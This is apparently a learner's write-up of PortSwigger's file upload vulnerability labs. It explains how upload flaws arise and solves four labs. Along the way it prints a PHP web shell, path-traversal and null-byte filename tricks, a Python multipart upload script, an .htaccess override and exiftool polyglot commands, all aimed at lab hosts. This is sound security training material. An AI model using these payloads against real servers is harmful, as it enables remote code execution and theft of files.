# File Upload vulnerabilities

This writeup covers the learning path *File upload vulnerabilities* on Portswigger.

## Part 1: What are file upload vulnerabilities?

A file upload vulnerability arises when a web server allows users to upload files to the underlying file system. If the web application does not validate file name, type, contents or size it could result in a variety of attack possibilites for an adversary. In the worst case an uploaded file could allow the attacker to obtain remote code execution (RCE). Often the attacker will send an additional HTTP request to the server, requesting the file for execution of the file.

Additionally if the name of the uploaded file is not validated it may allow an attacker to overwrite critical files on the system. If the file upload functionality is also vulnerable to directory traversal (An attacker is able to traverse the file system of the webserver) the attacker can save the file in unexpected locations. Last but not least, if the size is not validated the attacker can upload an extremely large file in order to cause a DoS (denial of service) attack.

### How do file upload vulnerabilities arise?

Web applications which have no validation of files are rare to come across in production environments, yet developers often forget to test their validation for edge cases and obscure file extensions. This is the hard part about any blacklist, meaning opting for an allowlist might be a better option. Also, the parsing of the file might be a problem if an attacker can craft a file name, extension or content which is parsed correctly by the parser but is not caught by the validation or sanitizaion.

A website might validate on properties which can easily be spoofed by an attacker as well.

## How do web servers handle requests for static files?

Static files are are server by webservers correlating to the path in the URL. Yet modern web servers and applications do not use a 1:1 relatioship between the URL path the filesystem like it used to be. That being said, static files are still served by most webservers. These files could be images, stylesheets and other assets the website uses to function.

The webserver uses the path of the HTTP request (parses it) and then determines the type of file being requested. What happens with the response is determined by the file extension and MIME types:

- If the file is non executable, the server simply returns the contents
- If the file type is executable, as with PHP and other server side languages, **and** the server is configured to execute files of this type it will execute the file and return the result. This may included variables which originated as user input (headers, query params).
- If the file is executable but the server isn't configured to execute the file, it will return an error (in most cases).

**NOTE:** The Content-Type response header might provide any clues as to what type of file the server thinks it has server. It might come in handy to examine.

## Exploiting unrestricted file uploads to deplay a web shell

I have previously covered web shells in the learning path "server side vulnerabilities", so please go and take a look at that if this concept is unfamiliar or confusing. Essentially a web shell allows an attacker to execute arbitrary commands on a remote server using HTTP requests (The attacker achieves RCE).

In order to exploit this vulnerability the server must be vulnerable to file upload, and the attacker must be able to make the server execute the file as well. A simple php webshell could be:

```php
<?php echo system($_GET['command']); ?>
```

Which allows the attacker to send a request to their file (now uploaded to the web server) with a command like so:

```HTTP
GET /example/filename.php?command=cat /etc/passwd HTTP/1.1
```

## Exploiting flawed validation of file uploads

Some web applications use the `multipart/form-data` Content-Type when uploading files. This type of data is split into different parts seperated by a *boundary*. Within each boundary a Content-Type header is present along with Content-Disposition which describes the input field used to provide the data. If the application only validates files on the Content-Type header (which specifies a MIME type) it is easily spoofed by an attacker.

**NOTE:** There is labs associated with the last two sections, yet I have already solved these during a different learning path (Server side vulnerabilities). Refer to that writeup instead for lab solutions.

## Preventing file execution in user accessible directories

If prevention of dangerous file types are impossible due to certain feature sets, it is a good idea to prevent the execution of the files which can potentially dangerous. This can be done by configuring the server to only execute files with a specific MIME type. If the server is configured correctly it will simply return and error or just the content of the file requested.

A way to mitigate the above as an attacker is to utilize the `filename` field in the `multipart/form-data` body. Often, servers store the file in the location specified by this field. Also, if it is possible to find a way to upload files to different directories than the user-accessible directories, these files might be able to execute, as the restrictions might be harsher in the user-accesible directories.

## Lab: Web shell upload via path traversal

**Lab Description**:  This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

### Lab solution

When logging in we are met with to forms. One for e-mail change and one for changing our avatar. The lab description hints that it is a vulnerable image upload function. Lets investigate the `avatar-upload-form`.

```HTML

<form class="login-form" id="avatar-upload-form" action="/my-account/avatar" method="POST" enctype="multipart/form-data">
    <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar">
    </p>
    <label>Avatar:</label>
    <input type="file" name="avatar">
    <input type="hidden" name="user" value="wiener">
    <input required="" type="hidden" name="csrf" value="FhroUd6QMBKkQn4kD3ys1y39XhlxqfnT">
    <button class="button" type="submit">Upload</button>
</form>
```

We see that we must provide a csrf token as well as our image file. Lets try to upload an image to inspect the request:

```HTTP
-----------------------------255966847724769247663672816653
Content-Disposition: form-data; name="avatar"; filename="Screenshot from 2024-04-03 13-37-09.png"
Content-Type: image/png

PNG (PNG DATA OMITTED)
-----------------------------255966847724769247663672816653
Content-Disposition: form-data; name="user"

wiener
-----------------------------255966847724769247663672816653
Content-Disposition: form-data; name="csrf"

FhroUd6QMBKkQn4kD3ys1y39XhlxqfnT
-----------------------------255966847724769247663672816653--
```

The response of the server states: 

```HTML
The file avatars/Screenshot from 2024-04-03 13-37-09.png has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Which suggest that the server saves the uploaded files without renaming them, in the `avatars` folder. We can check to see if we can access this directory, in order to figure out the path. This might come in handy when we are required to do some directory traversal. If we look in the network tab, we see that when visiting our profile the server fetches our new avatar from: `https://0ac60067046ea179809762be007c0063.web-security-academy.net/files/avatars/Screenshot%20from%202024-04-03%2013-37-09.png`.

This suggest we might need to go atleast one extra folder down the path to hit some sort of priviliged directory.

Now we can craft our web shell payload and try to upload it. Lets use the basic webshell from before:

```php
<?php echo system($_GET['command']); ?>
```

To begin with, we just upload the file like we would all other files to check for validation. The file gets uploaded just fine. Lets see if we can access it: `https://0ac60067046ea179809762be007c0063.web-security-academy.net/files/avatars/webshell.php`. Returns 200 and a blank page containing the php code in the raw output. Great! we can upload the php. Now we need to figure out how to store in a directory, where it can be executed.

The HTTP request for uploading the webshell looks like this:

```HTTP
-----------------------------214322694323767243572573652254
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: application/x-php

<?php echo system($_GET['command']);

-----------------------------214322694323767243572573652254
Content-Disposition: form-data; name="user"

wiener
-----------------------------214322694323767243572573652254
Content-Disposition: form-data; name="csrf"

FhroUd6QMBKkQn4kD3ys1y39XhlxqfnT
-----------------------------214322694323767243572573652254--
```

For sanity check we can simply edit and resend the request in firefox. Taking the hint of the previous explanations, the `filename` attribute is often used for both the name and the directory in which the file is stored. We might be able to simply add `../../webshell.php` to the request:

```HTTP
-----------------------------214322694323767243572573652254
Content-Disposition: form-data; name="avatar"; filename="../../webshell.php"
Content-Type: application/x-php

<?php echo system($_GET['command']);

-----------------------------214322694323767243572573652254
Content-Disposition: form-data; name="user"

wiener
-----------------------------214322694323767243572573652254
Content-Disposition: form-data; name="csrf"

FhroUd6QMBKkQn4kD3ys1y39XhlxqfnT
-----------------------------214322694323767243572573652254--
```

This returns an error response: `Missing parameter 'csrf'`. We might need to encode the slash. I always use cyberchef for this kind of task: <https://gchq.github.io/CyberChef/>. Trying ..%2Fwebshell.php returns "No user param supplied" when using curl. I recall that someitmes cUrl can have a hard time with this kind of request. Last time I crafted a python script for sending multipart data. Lets try to use that.

```python
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

# response = requests.get("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account?id=wiener")
multipart_data = MultipartEncoder(fields={
    'avatar': ('webshell.php', "<?php echo file_get_contents('/home/carlos/secret');", "image/jpeg"),
    'csrf': "jceEZQqiBaO2Raue8Ma5HIsvJZjbErsk",
    'user': "wiener"
})

headers = {
    "Cookie": "session=ouPQveWk4Td9dZzD7a2AUYq1GGVLzgTE",
    'Content-Type': multipart_data.content_type
}

response = requests.post("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account/avatar", headers=headers, data=multipart_data)

print(response.text, " - ", response.status_code)
```

It looks like it works! The response is: `The file avatars/../webshell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>  -  200`

Now as we found out before, the files are stored in the path: `/files/avatars/filename`. inserting the `../` will therefore save the file in the `/files` directory. If this directory is allowed to execute php code, we should be able to fetch the file from the url `https://laburl.web-security-academy.net/files/webshell.php`. Notice that the payload of the webshell is changed to print the contents of carlos' secret. It works! Secret: `frRFI9DLhyd8RtJCJX32Qjn3UYCl0P0A`. (I hope these secrets are random? I would believe so). We could just as well have used the old webshell. In fact lets try.

That also works! supplying `/files/webshell.php?command=id` outputs: `uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)`. Using `/home/carlos/secret` would also output the secret. This solves the lab!

## Insufficient blacklisting of dangerous file types

While blacklisting is a worse practice than whitelisting, because of the complexity of maintaining a valid and secure blacklist (many different types of files might be omitted), some still use blacklists. Often blacklists can be bypassed by using lesser known file types which are still executeable.

### Overriding the server configuration

Because servers often are configured to only execute files in certain directories. An attacker might be able to override this configuration, allowing for files to be executed in user controlled directories. One example of configuration files are for Apache servers, which will load a directory specific configuration from `.htaccess`.

Microsoft uses IIS servers, where a `web.config` file is used for the same purpose as `.htaccess`. A server which serves JSON files to the user could have the following content i `web.config`:

```xml
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>
```

Overriding this type of file might be possible, if the server does not dissallow configuration file extensions.

## Lab: Web shell upload via extension blacklist bypass

**Lab Description**:  This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

### Lab solution

This lab presents the same avatar upload functionality as we have previously seen. To begin with I uploaded the `webshell.php` to `{labURL}/my-account/avatar` and we are denied the possibility to upload .php files. After this I tried with a regular .png file, which was uploaded just fine. As the lab suggests, it is a bypassable blacklist. I tried with different file types, but non of them executed on the server. This seems to be a clue as to the material about overriding directory permissions, presented before the lab.

Looking at the headers, we see that it is an Apache server we are communicating with:

```http
HTTP/2 403 
date: Mon, 22 Apr 2024 18:12:05 GMT
server: Apache/2.4.41 (Ubuntu)
content-type: text/html; charset=UTF-8
x-frame-options: SAMEORIGIN
content-encoding: gzip
content-length: 149
X-Firefox-Spdy: h2
```

This means that we should try to upload a `.htaccess`, which allows a filetype of our choice to be executed. We should however keep in mind that there is still a blacklist in place, which is probably enforced by the application running on the server. This means we should not try to allow the execution of .php files. I browsed around to look for `.htaccess` formats and commands, but did not find anything related to this particular use case, where I then resorted to looking in the solution hints and found: `AddType application/x-httpd-php .l33t`. This line adds the specified mimetype and configures it as the content-type `application/x-httpd-php`, allowing for execution of the php code within `.l33t` files.

Using the python multipart script from the previous labs and our newly uploaded `.htaccess` file we can now upload a `webshell.l33t` file containing: `<?php echo system($_GET['command']);`. Going back to our account page, we observe that the avatars are fetched from `{labUrl}/files/avatars/`. This means we can execute: `t/files/avatars/webshell.l33t?command=cat /home/carlos/secret`. This gave me the secret and solved the lab!

## Obfuscating file extensions

A common way to evade exhaustive blacklists are obfuscating file extensions, in order to confuse the validating code but not the process which executes the files. This can be done by using URL encoding on special characters: `exploit.php` --> `exploit%2Ephp`. Other methods include:

- providing multiple extensions: `exploit.php` --> `exploit.php.jpg`. Depending on the parse order, this could bypass validation but be executed as php.
- Adding trailing characters: `exploit.php` --> `exploit.php.`. Could also work with whitespaces.
- Adding semicolons or URL-encoded null byte chars. Depending on the language of validation code vs. server execution processes, these can be interpreted as different end of filename chars. `exploit.php` --> `exploit.php;.jpg` or `exploit.php` --> `exploit.asp%00.jpg`.
- Multibyte unicode characters could be converted tp null bytes or dots after a conversion happens server side. This could be sequences like: `xC0 x2E, xC4 xAE or xC0 xAE` --> `x2E` if an UTF-8 to ASCII conversion is done.

A final defensive way of disallowing file extensions is stripping the extension from the file name. If this is not done recursively (or checked after each removal) a filename like `exploit.p.phphp` will result in: `exploit.php` after the stripping has been done. Many more obfuscation methods exist.

## Lab: Web shell upload via obfuscated file extension

**Lab Description**:  This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique. 

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

### Lab solution

We are presented with an avatar upload functionality once again, this means the approach will be the same as in the previous labs.

Trying to upload our trusted `webshell.php` results in the following response: 

```HTML
Sorry, only JPG & PNG files are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

The description says that the validation can be bypassed using a classic obfuscation technique, and since the reponse tells us that `.jpg` and `.png` are allowed, let's try to append one of these to our webshell. The file will look like this: `webshell.php.jpg`

In order to upload the file, i modified the multipart python script: 

```python
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

# response = requests.get("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account?id=wiener")
multipart_data = MultipartEncoder(fields={
    'avatar': ('webshell.php.jpg', "<?php echo system($_GET['command']);", "image/jpeg"),
    'csrf': "ppP0cOArqEAJywpjk01eQEXQ9fwtKa7b",
    'user': "wiener"
})

headers = {
    "Cookie": "session=nMnoFTgdIRkE5Tx3ekHqmQ3xRmy930Jz",
    'Content-Type': multipart_data.content_type
}

response = requests.post("https://0a88003f0373832b84c5774e004d00d5.web-security-academy.net/my-account/avatar", headers=headers, data=multipart_data)

print(response.text, " - ", response.status_code)
```

The response came back as: 

```HTML
The file avatars/webshell.php.jpg has been uploaded.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>  -  200
```

Yay! Seems like a success. Lets try to use our newly uploaded webshell.Files are located on the `/files/avatars/` path yet again. Visiting the path, we are met by a message telling us that the image contains errors and therefore cannot be displayed. This is because our file still has the `.jpg` part appended. We need to strip it. Using the tricks mentioned during the learning path we can insert a nullbyte. The filename becomes: `webshell.php%00.jpg`.

The response instantly looks better. Notice there is no `.jpg` in the filename:

```html
The file avatars/webshell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>  -  200
```

Now visiting the file, will print out carlos secret! Very neat trick to bypass both validation and constraints on executing the file. This solves the lab!

## Flawed validation of file contents

Some servers validate the contents of the file being uploaded instead of trusting the insecrue `Content-Type` header. This could be magic bytes or properties of the specified file type. Like dimensions for an image. Checking magic bytes include verifying specific sequences of bytes which are always found in a file of a certain type. Sometimes, even checking these sequences can be too little protection, as tools such as ExifTool can be used to create files with malicious code inside the metadata.

## Lab: Remote code execution via polyglot web shell upload

**Lab Description**:   This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

### Lab solution

First, we should verify which type of file we are able to upload to the server. Given that it is an image upload function, a good bet would be only image file types such as `jpg`, `jpeg` and `png`. Using a random `.png` file, we are able to upload a file:

```html
The file avatars/Screenshot from 2024-04-30 16-28-33.png has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

 Lets try to see the error we are going to get with pure `.php` file:

```html
Error: file is not a valid image
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

We get a 403 (forbidden) and the above output. We can simply try to use ExifTool to encode our webshell with jpg or png data, we do not know anything about how the content validation is done, but assuming it is the first bytes of the file will be the first approach.

Using exiftool and an existing `.png` it was possible to create a modified png image, with the webshell in the metadata. The commands used were:

```bash
exiftool -comment="<?php echo system(\$_GET['command']); ?>" webshellTest.png
```

Notice that you need to escape the `$` sign. If we use exiftool to print the information we get:

```bash
ExifTool Version Number         : 12.64
File Name                       : webshellTest.png
Directory                       : .
File Size                       : 52 kB
File Modification Date/Time     : 2024:05:01 19:06:36+02:00
File Access Date/Time           : 2024:05:01 19:07:00+02:00
File Inode Change Date/Time     : 2024:05:01 19:06:36+02:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 612
Image Height                    : 384
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8 8
Software                        : 
Creation Time                   : Tue 30 Apr 2024 04:04:00 PM CEST
Comment                         : <?php echo system($_GET['command']); ?>
Image Size                      : 612x384
Megapixels                      : 0.235
```

And the webshell is inplace at the Comment tag. I dont imagine that this just works, but lets give it a shot. Naturally the file is located at: `{yourLabLink}.web-security-academy.net/files/avatars/webshellTest.png`. Naturally, visiting the path and giving a command, simply returns the image. We need the server to interpret our image as code. Maybe chaning the extension will work, if that is not being verified.

Surely enough, uploading the file with a `.php` works fine:

```html
The file avatars/webshellTest.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>

```

Visiting this file with `?command=ls` appended will output a large amount of gibberish, but also the contents of the current directory:

```png
PNG

   
IHDR  d     ,~µ   sBIT|d   tEXtSoftware gnome-screenshotï¿>   .tEXtCreation Time Tue 30 Apr 2024 04:04:00 PM CESTd!¤   /tEXtComment Screenshot from 2024-04-30 16-28-33.png
polyglot.php
webshellTest.php
webshellTest.png
webshellTest.pngqXäP    IDATxìÝw\UåÀñÏá^öA6¸÷Þ£45÷*÷OÍfÚree¤Ü{ïÔÊ=s¸q ¢¢ìuïýý&S/]ªïûõâõë¹Ïó=ÏyÎy¾ç9ÅÂÂKB!0#C Bñ_'	B!IB&Ba`	!B$dB!&	ÅÌèÑýñôt1tB!þF	ñèÑã5C!âN2!
ÉÓÓêÕËãééB½zU°±±2tHB!þ¡$!¢lm­(YÒ //WÌÌLB*IÈ(¤ÐÐ
```

**Note**: I shortened the output for brevity.

As you can see the files are listed in the output. Now we just need to output the secret. This is done with the command: `cat /home/carlos/secret` which outputs:

```html
PNG  IHDRd,~µsBIT|dtEXtSoftwaregnome-screenshotï¿>.tEXtCreation TimeTue 30 Apr 2024 04:04:00 PM CESTd!¤/tEXtCommentk3nLb88FzkBr37T3Xmi9VHQMCi5RodLrk3nLb88FzkBr37T3Xmi9VHQMCi5RodLrqXäP IDATxìÝw\UåÀñÏá^öA6¸÷Þ£45÷*÷OÍfÚree¤Ü{ïÔÊ=s¸q ¢¢ìuïýý&S/]ªïûõâõë¹Ïó=ÏyÎy¾ç9ÅÂÂKB!0#C Bñ_' B!IB&Ba` !B$dB!& ÅÌèÑýñôt1tB!þF ñèÑã5C!âN2! ÉÓÓêÕËãééB½zU°±±2tHB!þ¡$!¢lm­(YÒ//
```

where the secret is just after *Comment*: `Commentk3nLb88FzkBr37T3Xmi9VHQMCi5RodLr`. This solves the lab!

**Note**: I viewed the solution on Portswigger afterwards. They create a polyglot file where a `.php` is the output of ExifTool using `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`. Also adding a *Start* and *End* to the output, to easilier identify where the outputted string is. Quite neat trick.

